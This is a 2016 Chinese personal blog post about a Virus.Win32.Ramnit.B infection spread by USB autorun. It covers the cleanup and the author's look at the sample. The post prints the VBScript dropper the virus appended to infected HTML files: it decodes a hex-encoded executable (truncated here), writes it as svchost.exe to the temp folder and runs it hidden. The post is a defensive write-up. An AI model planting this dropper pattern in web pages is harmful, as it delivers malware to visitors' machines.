---
layout: posts
title: 对病毒Virus.Win32.Ramnit.B的研究
createTime: 2016-07-18
---

## 不作死就不会死
前一段时间在折腾电脑。由于我嫌开的进程多了有点卡，就把Windows Defender给关闭了，关掉后果然很快。有一次要用U盘，插上后发现图标变成文件夹了，顿时感觉不太对劲，糟了！cmd进去dir一下，果然有个autorun.inf，里面指向了一个在U盘根目录下RECYCLED文件夹内一个隐藏文件夹里的可执行文件，文件名还是一串字母！完蛋，中招了。用WinRAR把那个可疑文件打包留作样本，在线杀毒，果然是病毒。我自认为水平还不错，不想重装系统，于是就踏上了一条漫长的杀毒路。



## 土法全盘杀毒
从U盘PE启动电脑，用360急救箱全盘杀毒。虽然前几年360流氓过一阵子，但最近奇虎公司不景气，产品也就没敢那么流氓（猜测），总之是很好用的。睡前挂上全盘扫描，醒来一看：
![扫描结果](http://images2015.cnblogs.com/blog/585442/201607/585442-20160730230917419-1449863200.png)

反复杀了几次毒，直到不再有病毒查出。重启由硬盘引导，装上360卫士和杀毒，再查一遍，竟然查出我的网页文件也有毒（后文会详细说到）。幸亏我开了系统还原，还原到两天前的版本，问题解决。最后把这些杀毒软件统统请出硬盘，打开Windows Defender，世界又重归宁静。



## 对病毒样本的深入研究
这是从U盘中捕获的病毒样本：

![样本](http://images2015.cnblogs.com/blog/585442/201607/585442-20160730230922591-1044069392.png)

体积很小，那个autorun.inf是自动播放配置文件，病毒就是利用它传播的。上传到某在线杀毒网站检测：
![检测结果1](http://images2015.cnblogs.com/blog/585442/201607/585442-20160730230929809-361428692.png)

![检测结果2](http://images2015.cnblogs.com/blog/585442/201607/585442-20160730230933325-1268121088.png)
![检测结果3](http://images2015.cnblogs.com/blog/585442/201607/585442-20160730230937684-495119374.png)
![检测结果4](http://images2015.cnblogs.com/blog/585442/201607/585442-20160730230940622-1194387489.png)

由于我不是什么高级用户，也就无法查看更多的信息。不过仅凭这些表现，我们就可以知道它是一个功能全面的后门程序。首先，它可以寄生在可执行文件中（文件行为·2）；然后通过网络获取控制者的命令，之后的推广软件、盗号、各种门事件就顺理成章了。除此之外，它还自带反虚拟机功能，用以躲避试验。
除了这些，我刚刚提到过它会感染我的网页文件（*.html;*.htm）：
![网页文件感染前后](http://images2015.cnblogs.com/blog/585442/201607/585442-20160730230944466-1673405399.png)

这是我的一个网页文件在感染前后的对比。查看被感染后的文件，我在它们的末尾发现了这些奇怪的东西：

	<SCRIPT Language=VBScript><!--
	DropFileName = "svchost.exe"
	WriteData = "4D5A90000300000004000000FFFF0000B80000000000000040000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
	……（此处略）
	5616C467265650000004578697450726F636573730000004472616746696E697368000057696E48656C705700000000000000000000"
	Set FSO = CreateObject("Scripting.FileSystemObject")
	DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
	If FSO.FileExists(DropPath)=False Then
	Set FileObj = FSO.CreateTextFile(DropPath, True)
	For i = 1 To Len(WriteData) Step 2
	FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
	Next
	FileObj.Close
	End If
	Set WSHshell = CreateObject("WScript.Shell")
	WSHshell.Run DropPath, 0
	//--></SCRIPT>

这个VB脚本就是用来释放病毒的。为了避免在某些不支持这类脚本的浏览器上显示出来，病毒设计者还别出心裁地在脚本前后加上了html的注释符“<!-”和“->”。



## 其他的专业分析
我还在[Microsoft](http://microsoft.com)上看到一些对此类病毒的分析：
+ [Virus: Win32/Ramnit.A](https://www.microsoft.com/security/portal/threat/encyclopedia/entry.aspx?Name=Virus%3aWin32%2fRamnit.A)
+ [Virus: Win32/Ramnit.B](https://www.microsoft.com/security/portal/threat/encyclopedia/entry.aspx?Name=Virus:Win32/Ramnit.B#tab=1)
+ [Trojan: Win32/Ramnit.C](https://www.microsoft.com/security/portal/threat/encyclopedia/entry.aspx?Name=Trojan%3aWin32%2fRamnit.C)
+ [Virus: Win32/Ramnit.I](https://www.microsoft.com/security/portal/threat/encyclopedia/entry.aspx?Name=Virus%3aWin32%2fRamnit.I)

它们都是一类病毒，有时会同时感染多种。比方说，我就同时感染了Ramnit.A和Ramnit.B。



## 个人观点
直到现在我的一些软件所带的html文件仍然被感染。虽然常见的杀毒软件均可杀查（360直接删文件，360急救箱不完美修复，MSE完美修复），但想要根除仍很麻烦，似乎全盘格式化才是最快的方法。


